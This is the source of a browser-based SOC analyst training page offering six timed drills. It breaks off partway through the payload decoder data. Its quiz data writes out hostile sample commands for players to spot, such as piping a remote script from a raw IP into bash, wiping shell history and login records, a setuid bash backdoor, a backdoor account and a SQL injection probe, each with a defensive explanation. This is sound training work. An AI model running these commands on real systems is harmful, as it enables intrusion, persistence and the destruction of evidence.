---
layout: page
title: Games
icon: fas fa-crosshairs
order: 3
permalink: /games/
---

<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">

<div class="rg">
  <div class="rg-bg"><span class="rg-sweep"></span></div>

  <header class="rg-top">
    <div>
      <p class="rg-eye">// soc training range</p>
      <h1 class="rg-title">Six drills. One console.</h1>
      <p class="rg-sub">Every game here is a real thing analysts do on shift. Nothing is stored on a server. Your rank lives in this browser only.</p>
    </div>
    <div class="rg-rank">
      <span class="rg-rank-l">analyst rank</span>
      <b id="rg-rank">Tier 1</b>
      <div class="rg-xpbar"><i id="rg-xpfill"></i></div>
      <span class="rg-xp"><span id="rg-xp">0</span> XP</span>
    </div>
  </header>

  <div id="rg-menu" class="rg-menu"></div>

  <section id="rg-stage" class="rg-stage" hidden>
    <div class="rg-stage-bar">
      <button class="rg-back" id="rg-back">&#8592; range</button>
      <span class="rg-stage-name" id="rg-stage-name"></span>
      <div class="rg-hud">
        <span>SCORE <b id="rg-score">0</b></span>
        <span>STREAK <b id="rg-streak">0</b></span>
        <span id="rg-prog-w">ROUND <b id="rg-prog">0</b></span>
      </div>
    </div>
    <div class="rg-timer"><i id="rg-timer"></i></div>
    <div class="rg-play" id="rg-play"></div>
  </section>
</div>

<style>
.rg{
  --base:#06080D; --surf:#0C1119; --surf2:#111823;
  --line:rgba(255,255,255,.09);
  --violet:#7C5CFF; --mint:#00F0B5; --rose:#FF4D6D; --amber:#FFB020;
  --steel:#8A97AB; --ice:#DCE4F0;
  --d:'Chakra Petch',system-ui,sans-serif;
  --m:'IBM Plex Mono',ui-monospace,monospace;
  position:relative;font-family:var(--d);color:var(--ice);
  margin:-1.5rem -1rem 0;padding:clamp(26px,4vw,44px) 20px clamp(50px,7vw,80px);
  background:var(--base);overflow:hidden;min-height:78vh;
}
.rg *{box-sizing:border-box;margin:0;padding:0}

/* ── background ── */
.rg-bg{position:absolute;inset:0;pointer-events:none;overflow:hidden;
  background-image:linear-gradient(rgba(124,92,255,.055) 1px,transparent 1px),linear-gradient(90deg,rgba(124,92,255,.055) 1px,transparent 1px);
  background-size:44px 44px;
  mask-image:radial-gradient(ellipse 90% 70% at 50% 30%,#000 20%,transparent 88%);
  -webkit-mask-image:radial-gradient(ellipse 90% 70% at 50% 30%,#000 20%,transparent 88%);
}
.rg-sweep{position:absolute;top:-40%;left:-60%;width:70%;height:180%;
  background:linear-gradient(100deg,transparent,rgba(124,92,255,.10),transparent);
  animation:rgSweep 9s linear infinite;}
@keyframes rgSweep{0%{transform:translateX(0)}100%{transform:translateX(260%)}}
.rg>*:not(.rg-bg){position:relative;z-index:2}

/* ── header ── */
.rg-top{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;
  padding-bottom:22px;border-bottom:1px solid var(--line);margin-bottom:clamp(24px,4vw,38px)}
.rg-eye{font-family:var(--m);font-size:10px;letter-spacing:.24em;text-transform:uppercase;color:var(--violet);margin-bottom:9px!important}
.rg-title{font-weight:700;font-size:clamp(1.5rem,4.4vw,2.3rem);line-height:1.1;color:#fff;margin-bottom:9px!important}
.rg-sub{color:var(--steel);font-size:clamp(.84rem,1.6vw,.96rem);line-height:1.65;max-width:480px}
.rg-rank{text-align:right;min-width:150px}
.rg-rank-l{display:block;font-family:var(--m);font-size:9px;letter-spacing:.2em;text-transform:uppercase;color:var(--steel)}
.rg-rank b{display:block;font-size:1.25rem;color:var(--mint);font-weight:600;margin:3px 0 8px}
.rg-xpbar{height:4px;border-radius:3px;background:rgba(255,255,255,.08);overflow:hidden}
.rg-xpbar i{display:block;height:100%;width:0;border-radius:3px;background:linear-gradient(90deg,var(--violet),var(--mint));transition:width .6s}
.rg-xp{display:block;font-family:var(--m);font-size:10px;color:var(--steel);margin-top:6px}

/* ── menu ── */
.rg-menu{display:grid;grid-template-columns:repeat(auto-fit,minmax(255px,1fr));gap:12px}
.rg-card{border:1px solid var(--line);border-radius:13px;background:var(--surf);
  padding:19px;cursor:pointer;transition:all .22s;position:relative;overflow:hidden}
.rg-card::after{content:'';position:absolute;inset:0;opacity:0;transition:opacity .22s;
  background:radial-gradient(circle at 50% 0%,rgba(124,92,255,.14),transparent 62%)}
.rg-card:hover{border-color:var(--violet);transform:translateY(-3px)}
.rg-card:hover::after{opacity:1}
.rg-card>*{position:relative;z-index:2}
.rg-ci{font-size:1.5rem;line-height:1;margin-bottom:12px;display:block}
.rg-cn{font-weight:600;font-size:1.02rem;margin-bottom:6px!important;color:#fff}
.rg-cd{color:var(--steel);font-size:.83rem;line-height:1.58;margin-bottom:14px!important}
.rg-cf{display:flex;justify-content:space-between;align-items:center;font-family:var(--m);font-size:9.5px;letter-spacing:.1em;text-transform:uppercase}
.rg-diff{padding:3px 8px;border-radius:4px}
.dd1{background:rgba(0,240,181,.13);color:var(--mint)}
.dd2{background:rgba(255,176,32,.13);color:var(--amber)}
.dd3{background:rgba(255,77,109,.13);color:var(--rose)}
.rg-best{color:var(--steel)}

/* ── stage ── */
.rg-stage{border:1px solid var(--line);border-radius:13px;background:var(--surf);overflow:hidden}
.rg-stage-bar{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:13px 16px;
  background:rgba(124,92,255,.07);border-bottom:1px solid var(--line)}
.rg-back{font-family:var(--m);font-size:10.5px;letter-spacing:.08em;background:transparent;
  border:1px solid var(--line);color:var(--steel);padding:6px 12px;border-radius:6px;cursor:pointer;transition:all .18s}
.rg-back:hover{border-color:var(--violet);color:var(--ice)}
.rg-stage-name{font-family:var(--m);font-size:11.5px;color:var(--ice);flex:1;min-width:120px}
.rg-hud{display:flex;gap:15px;font-family:var(--m);font-size:9.5px;letter-spacing:.12em;color:var(--steel)}
.rg-hud b{color:var(--mint);font-size:13px;margin-left:5px}
.rg-timer{height:3px;background:rgba(255,255,255,.06)}
.rg-timer i{display:block;height:100%;width:100%;background:linear-gradient(90deg,var(--mint),var(--amber),var(--rose));transition:width .1s linear}
.rg-play{padding:clamp(18px,3vw,28px)}

/* ── shared play bits ── */
.rg-q{font-size:clamp(.95rem,2vw,1.15rem);line-height:1.5;margin-bottom:18px!important;color:#fff;font-weight:500}
.rg-panel{border:1px solid var(--line);border-radius:9px;background:var(--surf2);padding:15px;margin-bottom:16px}
.rg-kv{display:flex;gap:12px;font-family:var(--m);font-size:11.5px;padding:5px 0;line-height:1.5}
.rg-kv span:first-child{color:var(--steel);min-width:88px;flex-shrink:0}
.rg-kv span:last-child{color:var(--ice);word-break:break-word}
.rg-opts{display:flex;gap:9px;flex-wrap:wrap}
.rg-o{font-family:var(--m);font-size:11.5px;padding:11px 18px;border-radius:8px;cursor:pointer;
  background:transparent;border:1px solid var(--line);color:var(--ice);transition:all .18s;flex:1;min-width:120px}
.rg-o:hover:not(:disabled){border-color:var(--violet);background:rgba(124,92,255,.1)}
.rg-o:disabled{opacity:.35;cursor:not-allowed}
.rg-o.ok{border-color:var(--mint);background:rgba(0,240,181,.14);color:var(--mint)}
.rg-o.no{border-color:var(--rose);background:rgba(255,77,109,.14);color:var(--rose)}
.rg-fb{margin-top:15px;padding:12px 15px;border-radius:8px;font-size:.85rem;line-height:1.62;display:none}
.rg-fb.on{display:block}
.rg-fb.good{background:rgba(0,240,181,.09);border-left:2px solid var(--mint)}
.rg-fb.bad{background:rgba(255,77,109,.09);border-left:2px solid var(--rose)}
.rg-fb b{color:#fff}
.rg-next{margin-top:14px;font-family:var(--m);font-size:11px;padding:10px 22px;border-radius:7px;
  background:var(--violet);border:none;color:#fff;cursor:pointer;font-weight:600;letter-spacing:.06em}
.rg-next:hover{background:#8E72FF}

/* log hunt */
.rg-logs{font-family:var(--m);font-size:10.5px;line-height:1.5;border:1px solid var(--line);border-radius:8px;overflow:hidden}
.rg-ln{padding:6px 11px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.035);color:var(--steel);transition:background .12s}
.rg-ln:last-child{border-bottom:none}
.rg-ln:hover{background:rgba(124,92,255,.11);color:var(--ice)}
.rg-ln.hit{background:rgba(0,240,181,.17);color:var(--mint)}
.rg-ln.miss{background:rgba(255,77,109,.15);color:var(--rose)}

/* kill chain */
.rg-chain{display:flex;flex-direction:column;gap:7px;margin-bottom:15px}
.rg-step{display:flex;align-items:center;gap:11px;padding:11px 14px;border:1px solid var(--line);
  border-radius:8px;cursor:pointer;font-size:.85rem;transition:all .18s;background:var(--surf2)}
.rg-step:hover:not(.used){border-color:var(--violet)}
.rg-step.used{opacity:.28;cursor:not-allowed}
.rg-step-n{font-family:var(--m);font-size:10px;color:var(--violet);min-width:20px}
.rg-slots{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:15px;min-height:34px}
.rg-slot{font-family:var(--m);font-size:10px;padding:6px 11px;border-radius:20px;
  background:rgba(124,92,255,.14);color:var(--ice);border:1px solid rgba(124,92,255,.35)}

/* result */
.rg-res{text-align:center;padding:clamp(24px,5vw,44px) 10px}
.rg-res-n{font-family:var(--m);font-size:clamp(2.2rem,8vw,3.4rem);font-weight:600;color:var(--mint);line-height:1}
.rg-res-t{font-size:1.1rem;font-weight:600;color:#fff;margin:14px 0 8px!important}
.rg-res-s{color:var(--steel);font-size:.88rem;line-height:1.65;max-width:400px;margin:0 auto 22px!important}
.rg-res-b{display:flex;gap:9px;justify-content:center;flex-wrap:wrap}

@media(max-width:640px){
  .rg-top{align-items:flex-start}
  .rg-rank{text-align:left}
  .rg-hud{width:100%;justify-content:space-between;gap:8px}
  .rg-o{min-width:0;flex:1 1 100%}
}
@media(prefers-reduced-motion:reduce){.rg-sweep{animation:none}}
</style>

<script>
(function(){
var R=document.querySelector('.rg'); if(!R) return;

/* ══════ STATE ══════ */
var S={xp:0,best:{}};
try{var raw=localStorage.getItem('rg_state'); if(raw) S=JSON.parse(raw)}catch(e){}
function save(){try{localStorage.setItem('rg_state',JSON.stringify(S))}catch(e){}}

var RANKS=[[0,'Tier 1'],[400,'Tier 2'],[1000,'Tier 3'],[1900,'Senior Analyst'],[3000,'Threat Hunter'],[4500,'Detection Lead']];
function rank(){var r=RANKS[0];for(var i=0;i<RANKS.length;i++){if(S.xp>=RANKS[i][0])r=RANKS[i]}return r}
function nextAt(){for(var i=0;i<RANKS.length;i++){if(S.xp<RANKS[i][0])return RANKS[i][0]}return RANKS[RANKS.length-1][0]}
function paintRank(){
  var r=rank(),n=nextAt(),prev=r[0];
  document.getElementById('rg-rank').textContent=r[1];
  document.getElementById('rg-xp').textContent=S.xp;
  var pct = n>prev ? Math.min(100,((S.xp-prev)/(n-prev))*100) : 100;
  document.getElementById('rg-xpfill').style.width=pct+'%';
}

/* ══════ GAMES ══════ */
var GAMES=[
 {id:'triage', i:'\u{1F6A8}', n:'Triage Queue',    d:'Alerts land one at a time. Call each one benign, investigate, or escalate. The clock does not wait.', diff:1, dl:'core skill'},
 {id:'hunt',   i:'\u{1F50E}', n:'Log Hunt',        d:'One line in the wall is malicious. Find it before the timer empties. Gets faster every round.',      diff:2, dl:'pattern'},
 {id:'chain',  i:'\u{1F517}', n:'Kill Chain',      d:'Seven events from one intrusion, shuffled. Put them back in the order they actually happened.',       diff:2, dl:'sequencing'},
 {id:'ioc',    i:'\u26A1',    n:'IOC or Noise',    d:'Twenty strings, four seconds each. Indicator of compromise, or perfectly normal? Go with your gut.',  diff:1, dl:'rapid fire'},
 {id:'decode', i:'\u{1F511}', n:'Payload Decoder', d:'Obfuscated payloads pulled from traffic. Decode them under time pressure.',                          diff:3, dl:'technical'},
 {id:'cmd',    i:'\u{1F6E1}', n:'Incident Command',d:'Ransomware is detonating across the estate. Seven decisions. Every one changes the outcome.',         diff:3, dl:'judgement'}
];

var menu=document.getElementById('rg-menu'),
    stage=document.getElementById('rg-stage'),
    play=document.getElementById('rg-play'),
    tbar=document.getElementById('rg-timer');

function paintMenu(){
  menu.innerHTML=GAMES.map(function(g){
    var b=S.best[g.id]||0;
    return '<div class="rg-card" data-g="'+g.id+'">'+
      '<span class="rg-ci">'+g.i+'</span>'+
      '<p class="rg-cn">'+g.n+'</p>'+
      '<p class="rg-cd">'+g.d+'</p>'+
      '<div class="rg-cf"><span class="rg-diff dd'+g.diff+'">'+g.dl+'</span>'+
      '<span class="rg-best">'+(b?('best '+b):'not played')+'</span></div></div>';
  }).join('');
}
paintMenu(); paintRank();

menu.addEventListener('click',function(e){
  var c=e.target.closest('.rg-card'); if(c) open(c.dataset.g);
});
document.getElementById('rg-back').addEventListener('click',function(){
  stop(); stage.hidden=true; menu.hidden=false; paintMenu(); paintRank();
});

/* ══════ ENGINE ══════ */
var G={id:null,score:0,streak:0,round:0,total:0,timer:null,tick:null};
function hud(){
  document.getElementById('rg-score').textContent=G.score;
  document.getElementById('rg-streak').textContent=G.streak>1?('x'+G.streak):G.streak;
  document.getElementById('rg-prog').textContent=G.round+'/'+G.total;
}
function stop(){clearInterval(G.tick);G.tick=null;tbar.style.width='100%'}
function countdown(ms,onEnd){
  stop(); var t=ms, step=50;
  tbar.style.width='100%';
  G.tick=setInterval(function(){
    t-=step; var p=Math.max(0,t/ms*100); tbar.style.width=p+'%';
    if(t<=0){stop(); onEnd&&onEnd()}
  },step);
}
function award(pts){
  G.score+=pts;
  hud();
}
function finish(title,note){
  stop();
  var gained=Math.round(G.score/2);
  S.xp+=gained;
  if(!S.best[G.id]||G.score>S.best[G.id]) S.best[G.id]=G.score;
  save(); paintRank();
  play.innerHTML='<div class="rg-res">'+
    '<div class="rg-res-n">'+G.score+'</div>'+
    '<p class="rg-res-t">'+title+'</p>'+
    '<p class="rg-res-s">'+note+'<br><b style="color:var(--mint)">+'+gained+' XP</b></p>'+
    '<div class="rg-res-b">'+
      '<button class="rg-next" id="rg-again">Run it again</button>'+
      '<button class="rg-back" id="rg-menu2">Back to range</button>'+
    '</div></div>';
  document.getElementById('rg-again').onclick=function(){open(G.id)};
  document.getElementById('rg-menu2').onclick=function(){stage.hidden=true;menu.hidden=false;paintMenu()};
}
function open(id){
  var g=GAMES.filter(function(x){return x.id===id})[0];
  G={id:id,score:0,streak:0,round:0,total:0,timer:null,tick:null};
  menu.hidden=true; stage.hidden=false;
  document.getElementById('rg-stage-name').textContent=g.n;
  hud(); stop();
  ({triage:triage,hunt:hunt,chain:chain,ioc:ioc,decode:decode,cmd:cmd})[id]();
}
function shuffle(a){a=a.slice();for(var i=a.length-1;i>0;i--){var j=Math.random()*(i+1)|0;var t=a[i];a[i]=a[j];a[j]=t}return a}

/* ══════ 1. TRIAGE QUEUE ══════ */
var ALERTS=[
 {r:'Multiple failed logons then success',f:[['host','FIN-WS-014'],['user','j.mwangi'],['detail','23 failures in 40s, then success from 41.90.x.x'],['time','02:14 EAT']],a:2,
  w:'Escalate. Burst of failures followed by a success outside working hours is textbook brute force with a hit. Lock the account before anything else moves.'},
 {r:'Antivirus quarantined EICAR test file',f:[['host','IT-LAB-02'],['user','svc_lab'],['detail','EICAR-Test-File in C:\\Lab\\'],['time','11:02 EAT']],a:0,
  w:'Benign. EICAR is the standard harmless string used to verify AV is working. On a lab host it is almost certainly someone testing.'},
 {r:'vssadmin delete shadows executed',f:[['host','SRV-FILE-01'],['user','SYSTEM'],['detail','vssadmin.exe delete shadows /all /quiet'],['time','03:48 EAT']],a:2,
  w:'Escalate immediately. Deleting shadow copies has no legitimate business use on a file server and is one of the clearest pre-ransomware signals there is.'},
 {r:'Large outbound transfer to cloud storage',f:[['host','HR-WS-007'],['user','a.kimani'],['detail','2.4 GB to mega.nz over 18 min'],['time','16:20 EAT']],a:1,
  w:'Investigate. Could be a legitimate backup, could be exfiltration. Check whether the user has a business reason and what was in the transfer before escalating.'},
 {r:'New admin account created',f:[['host','DC-01'],['user','helpdesk3'],['detail','user "svc_backup2" added to Domain Admins'],['time','01:33 EAT']],a:2,
  w:'Escalate. Privileged account creation at 1am by a helpdesk account is a persistence move. Verify against change records, but treat as hostile until cleared.'},
 {r:'Password sprayed across 40 accounts',f:[['host','VPN-GW'],['user','multiple'],['detail','one password tried against 40 users, 2 successes'],['time','22:05 EAT']],a:2,
  w:'Escalate. Password spraying avoids lockout thresholds by trying few passwords across many accounts. Two successes means you already have compromised users.'},
 {r:'Impossible travel detected',f:[['host','n/a'],['user','p.otieno'],['detail','Nairobi 09:12, then Kyiv 09:41'],['time','09:41 EAT']],a:1,
  w:'Investigate. Strong signal, but VPN use and corporate proxies produce false positives constantly. Confirm the second location is not an egress point you own.'},
 {r:'Scheduled task created running PowerShell',f:[['host','ENG-WS-021'],['user','d.wanjiru'],['detail','task runs powershell -enc <base64> daily 04:00'],['time','19:47 EAT']],a:2,
  w:'Escalate. Encoded PowerShell on a schedule is persistence. The encoding exists specifically to defeat casual log review.'},
 {r:'User accessed 340 customer records',f:[['host','CRM-APP'],['user','s.achieng'],['detail','340 records in 22 min, role baseline is ~25/hr'],['time','14:10 EAT']],a:1,
  w:'Investigate. Well above baseline, but bulk access happens legitimately during migrations and audits. Ask the manager before treating it as insider theft.'},
 {r:'Certificate expiry warning',f:[['host','WEB-EXT-03'],['user','n/a'],['detail','TLS cert expires in 14 days'],['time','08:00 EAT']],a:0,
  w:'Benign. This is an operational hygiene ticket, not a security incident. Route it to infrastructure and move on.'},
 {r:'LSASS memory accessed by unusual process',f:[['host','FIN-WS-009'],['user','SYSTEM'],['detail','rundll32.exe reading lsass.exe memory'],['time','05:12 EAT']],a:2,
  w:'Escalate. That is credential dumping. Whatever process did it now likely holds domain credentials from that machine.'},
 {r:'Employee logged in from home',f:[['host','n/a'],['user','k.njoroge'],['detail','VPN session from known residential IP, MFA passed'],['time','20:15 EAT']],a:0,
  w:'Benign. Known IP, MFA satisfied, plausible hour. This is a normal remote working session.'}
];
function triage(){
  var q=shuffle(ALERTS).slice(0,8); G.total=q.length; hud();
  var LBL=['Benign','Investigate','Escalate'];
  function step(){
    if(G.round>=q.length){
      return finish(G.score>=560?'Sharp triage':'Shift complete',
        G.score>=560?'You called the high-severity ones fast and did not over-escalate the noise. That balance is the whole job.'
                   :'Over-escalating burns the team out. Under-escalating misses the breach. Run it again and watch the ones you hedged on.');
    }
    var a=q[G.round]; G.round++; hud();
    play.innerHTML='<p class="rg-q">'+a.r+'</p><div class="rg-panel">'+
      a.f.map(function(x){return '<div class="rg-kv"><span>'+x[0]+'</span><span>'+x[1]+'</span></div>'}).join('')+
      '</div><div class="rg-opts">'+LBL.map(function(l,i){return '<button class="rg-o" data-v="'+i+'">'+l+'</button>'}).join('')+
      '</div><div class="rg-fb" id="fb"></div>';
    var done=false;
    function answer(v){
      if(done) return; done=true; stop();
      var btns=play.querySelectorAll('.rg-o');
      btns.forEach(function(b){b.disabled=true});
      btns[a.a].classList.add('ok');
      var ok=(v===a.a);
      if(!ok && v>=0) btns[v].classList.add('no');
      if(ok){G.streak++;award(60+Math.min(G.streak,5)*12)}else{G.streak=0;hud()}
      var fb=document.getElementById('fb');
      fb.className='rg-fb on '+(ok?'good':'bad');
      fb.innerHTML='<b>'+(ok?(G.streak>2?'Correct. Streak x'+G.streak:'Correct.'):(v<0?'Time.':'Not this one.'))+'</b> '+a.w;
      var n=document.createElement('button'); n.className='rg-next'; n.textContent='Next alert';
      n.onclick=step; fb.appendChild(document.createElement('br')); fb.appendChild(n);
    }
    play.querySelectorAll('.rg-o').forEach(function(b){b.onclick=function(){answer(+b.dataset.v)}});
    countdown(11000,function(){answer(-1)});
  }
  step();
}

/* ══════ 2. LOG HUNT ══════ */
var BENIGN=[
 'sshd[2201]: Accepted publickey for deploy from 10.0.2.14 port 51022',
 'nginx: 10.0.1.7 "GET /api/health HTTP/1.1" 200 12',
 'cron[881]: (root) CMD (/usr/bin/logrotate /etc/logrotate.conf)',
 'systemd[1]: Started Daily apt download activities.',
 'nginx: 10.0.1.9 "POST /api/v2/orders HTTP/1.1" 201 340',
 'sshd[2290]: pam_unix(sshd:session): session opened for user deploy',
 'kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode',
 'nginx: 10.0.1.3 "GET /static/app.css HTTP/1.1" 304 0',
 'postfix/smtp: to=<ops@corp.co.ke>, status=sent (250 2.0.0 OK)',
 'systemd[1]: Reloading OpenBSD Secure Shell server.',
 'nginx: 10.0.1.5 "GET /favicon.ico HTTP/1.1" 200 1150',
 'sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/bin/systemctl restart app',
 'kernel: audit: type=1400 apparmor="STATUS" operation="profile_load"',
 'nginx: 10.0.1.8 "GET /api/v2/users/me HTTP/1.1" 200 812',
 'dhclient: DHCPACK of 10.0.2.14 from 10.0.0.1',
 'sshd[2310]: Received disconnect from 10.0.2.14 port 51022:11: disconnected by user'
];
var MALIC=[
 {l:'sshd[3312]: Accepted password for root from 45.83.64.19 port 44120',w:'Root login by password from an external address. Root SSH should be key-only and never exposed.'},
 {l:'bash: curl http://185.220.101.4/x.sh | bash',w:'Piping a remote script straight into a shell from a raw IP. That is a loader, not an install step.'},
 {l:'useradd[4410]: new user: name=svc_updt, UID=0, GID=0, home=/tmp',w:'A new account with UID 0 is a second root. Home directory in /tmp confirms it is not legitimate.'},
 {l:'nginx: 8.42.19.66 "GET /?id=1\u0027 UNION SELECT null,version()-- HTTP/1.1" 200',w:'Classic union-based SQL injection probe, and it returned 200 rather than an error.'},
 {l:'bash: history -c; unset HISTFILE; rm -rf /var/log/wtmp',w:'Clearing shell history and deleting login records. Nobody does this for operational reasons.'},
 {l:'sshd[5120]: Failed password for invalid user admin from 45.83.64.19 (x214)',w:'Two hundred failures against a nonexistent account from one source. Brute force in progress.'},
 {l:'cron[992]: (www-data) CMD (/tmp/.x/kdevtmpfsi -o pool.minexmr.com:4444)',w:'A hidden binary in /tmp pointing at a mining pool. Cryptojacking on a web server account.'},
 {l:'bash: cp /bin/bash /tmp/.sysd && chmod u+s /tmp/.sysd',w:'A setuid copy of bash hidden in /tmp. That is a root backdoor for later.'}
];
function hunt(){
  G.total=6; hud();
  function round(){
    if(G.round>=G.total){
      return finish(G.score>=520?'Fast eyes':'Range complete',
        G.score>=520?'You are reading log structure rather than reading every word. That is exactly how it works at volume.'
                   :'The trick is scanning for shape, not content. Odd IPs, /tmp paths, UID 0, piped downloads. Run it again.');
    }
    G.round++; hud();
    var bad=MALIC[Math.random()*MALIC.length|0];
    var lines=shuffle(BENIGN).slice(0,13+G.round);
    var at=Math.random()*(lines.length+1)|0;
    lines.splice(at,0,bad.l);
    var t=Math.max(4200,9000-G.round*750);
    play.innerHTML='<p class="rg-q">One line here is hostile. Round '+G.round+'.</p>'+
      '<div class="rg-logs">'+lines.map(function(l,i){
        return '<div class="rg-ln" data-i="'+i+'">'+l.replace(/</g,'&lt;')+'</div>'}).join('')+
      '</div><div class="rg-fb" id="fb"></div>';
    var done=false;
    function end(picked){
      if(done) return; done=true; stop();
      var els=play.querySelectorAll('.rg-ln');
      els[at].classList.add('hit');
      var ok=(picked===at);
      if(!ok&&picked>-1) els[picked].classList.add('miss');
      if(ok){G.streak++;award(70+Math.round(t/120)+Math.min(G.streak,5)*10)}else{G.streak=0;hud()}
      var fb=document.getElementById('fb');
      fb.className='rg-fb on '+(ok?'good':'bad');
      fb.innerHTML='<b>'+(ok?'Found it.':(picked>-1?'Wrong line.':'Time.'))+'</b> '+bad.w;
      var n=document.createElement('button');n.className='rg-next';n.textContent='Next round';
      n.onclick=round; fb.appendChild(document.createElement('br')); fb.appendChild(n);
    }
    play.querySelectorAll('.rg-ln').forEach(function(el){el.onclick=function(){end(+el.dataset.i)}});
    countdown(t,function(){end(-1)});
  }
  round();
}

/* ══════ 3. KILL CHAIN ══════ */
var CHAINS=[
 {n:'Ransomware intrusion',s:[
  'Phishing email with macro document opened by finance user',
  'Macro downloads and runs a loader from an external host',
  'Loader dumps credentials from LSASS memory',
  'Attacker moves laterally to the file server using stolen creds',
  'Backup agent service is stopped and shadow copies deleted',
  'Sensitive data archived and uploaded to external storage',
  'Ransomware payload deployed across the domain']},
 {n:'Credential-driven breach',s:[
  'Infostealer harvests browser credentials from a personal laptop',
  'Credentials sold on an access broker market',
  'Attacker authenticates to the VPN with valid credentials',
  'Session token stolen to bypass MFA on cloud apps',
  'Attacker enrols a new MFA device for persistence',
  'Mailbox rule created to auto-delete finance alerts',
  'Fraudulent supplier payment authorised and released']},
 {n:'Web application compromise',s:[
  'Attacker enumerates the application and finds an exposed endpoint',
  'SQL injection confirmed on an unsanitised parameter',
  'Database dumped including password hashes',
  'Hashes cracked offline against a wordlist',
  'Admin panel accessed with a recovered password',
  'Web shell uploaded through the file upload feature',
  'Server used as a pivot into the internal network']}
];
function chain(){
  var c=CHAINS[Math.random()*CHAINS.length|0];
  G.total=c.s.length; hud();
  var order=shuffle(c.s.map(function(s,i){return {t:s,i:i}}));
  var picked=[], correct=0;
  function paint(){
    play.innerHTML='<p class="rg-q">'+c.n+'. Put these seven events back in the order they happened.</p>'+
      '<div class="rg-slots">'+(picked.length?picked.map(function(p,i){
        return '<span class="rg-slot">'+(i+1)+'. '+p.t.slice(0,34)+(p.t.length>34?'\u2026':'')+'</span>'}).join(''):
        '<span class="rg-slot" style="opacity:.4;background:transparent;border-style:dashed">start with the first thing that happened</span>')+'</div>'+
      '<div class="rg-chain">'+order.map(function(o,idx){
        var used=picked.indexOf(o)>-1;
        return '<div class="rg-step'+(used?' used':'')+'" data-x="'+idx+'"><span class="rg-step-n">'+
          (used?(picked.indexOf(o)+1):'\u2022')+'</span>'+o.t+'</div>'}).join('')+
      '</div><div class="rg-fb" id="fb"></div>';
    play.querySelectorAll('.rg-step').forEach(function(el){
      el.onclick=function(){
        var o=order[+el.dataset.x];
        if(picked.indexOf(o)>-1) return;
        var expect=picked.length;
        picked.push(o); G.round=picked.length;
        if(o.i===expect){correct++;G.streak++;award(80+Math.min(G.streak,5)*15)}else{G.streak=0;hud()}
        if(picked.length===order.length){
          stop();
          var pct=Math.round(correct/order.length*100);
          return finish(pct===100?'Perfect chain':(pct>=60?'Mostly right':'Chain broken'),
            pct===100?'Seven for seven. You are thinking about intrusions as sequences, which is what turns alerts into a story.'
                     :correct+' of '+order.length+' in the right position. The order matters because it tells you where you can still intervene.');
        }
        paint();
      };
    });
  }
  paint();
}

/* ══════ 4. IOC OR NOISE ══════ */
var IOCS=[
 ['185.220.101.44',1,'Known Tor exit node range. Not automatically hostile, but never normal for a corporate egress.'],
 ['8.8.8.8',0,'Google public DNS. One of the most common addresses on any network.'],
 ['powershell -enc SQBFAFgA',1,'Encoded PowerShell. The encoding exists to hide the command from log review.'],
 ['C:\\Program Files\\Google\\Chrome',0,'Standard Chrome install path.'],
 ['xn--pple-43d.com',1,'Punycode homograph. Renders as "apple.com" but is a different domain entirely.'],
 ['svchost.exe',0,'Legitimate Windows service host. Suspicious only when the path or parent is wrong.'],
 ['C:\\Users\\Public\\svchost.exe',1,'Right name, wrong place. Real svchost lives in System32, never in Public.'],
 ['/var/log/auth.log',0,'Standard Linux authentication log path.'],
 ['1nvoice-paypa1.com',1,'Typosquat using the digit one for the letter l. Built to be misread at a glance.'],
 ['mimikatz.exe',1,'Credential dumping tool. There is no benign reason for it on a production host.'],
 ['10.0.1.24',0,'RFC 1918 private address. Ordinary internal host.'],
 ['certutil -urlcache -f http://',1,'Living off the land download. certutil is a signed Microsoft binary being abused as a downloader.'],
 ['GET /api/v2/health',0,'Routine health check endpoint.'],
 ['vssadmin delete shadows /all',1,'Shadow copy deletion. One of the highest fidelity pre-ransomware signals there is.'],
 ['nginx/1.24.0',0,'Standard web server version banner.'],
 ['ZmxhZ3tzMGNfNG40bHkVDN9',1,'Base64 blob in an unexpected field. Worth decoding before you dismiss it.'],
 ['Mozilla/5.0 (Windows NT 10.0)',0,'Common browser user agent string.'],
 ['python -c "import socket,subprocess,os"',1,'Opening imports for a reverse shell one-liner.'],
 ['DHCPACK from 10.0.0.1',0,'Normal DHCP lease acknowledgement.'],
 ['net user /add backdoor P@ss',1,'Account creation from the command line with an obvious name. Persistence.']
];
function ioc(){
  var q=shuffle(IOCS); G.total=q.length; hud();
  function step(){
    if(G.round>=q.length){
      return finish(G.score>=700?'Fast and accurate':'Round complete',
        G.score>=700?'You are recognising shape rather than reading carefully, which is what speed at volume actually requires.'
                   :'The hard ones are the legitimate binaries in the wrong place. Path matters as much as name.');
    }
    var it=q[G.round]; G.round++; hud();
    play.innerHTML='<p class="rg-q" style="font-family:var(--m);font-size:1.05rem;word-break:break-all;background:var(--surf2);padding:20px;border-radius:9px;border:1px solid var(--line)">'+
      it[0].replace(/</g,'&lt;')+'</p>'+
      '<div class="rg-opts"><button class="rg-o" data-v="0">Noise</button><button class="rg-o" data-v="1">Indicator</button></div>'+
      '<div class="rg-fb" id="fb"></div>';
    var done=false;
    function ans(v){
      if(done)return; done=true; stop();
      var bs=play.querySelectorAll('.rg-o'); bs.forEach(function(b){b.disabled=true});
      bs[it[1]].classList.add('ok');
      var ok=(v===it[1]);
      if(!ok&&v>-1) bs[v].classList.add('no');
      if(ok){G.streak++;award(40+Math.min(G.streak,8)*10)}else{G.streak=0;hud()}
      var fb=document.getElementById('fb');
      fb.className='rg-fb on '+(ok?'good':'bad');
      fb.innerHTML='<b>'+(ok?(G.streak>3?'Correct. x'+G.streak:'Correct.'):'No.')+'</b> '+it[2];
      setTimeout(step,ok?900:2100);
    }
    play.querySelectorAll('.rg-o').forEach(function(b){b.onclick=function(){ans(+b.dataset.v)}});
    countdown(5000,function(){ans(-1)});
  }
  step();
}

/* ══════ 5. PAYLOAD DECODER ══════ */
var PAY=[
 ['BASE64','ZXhmaWx0cmF0aW9u',['exfiltration'],'Base64. Decodes to a single word describing data leaving the network.'],
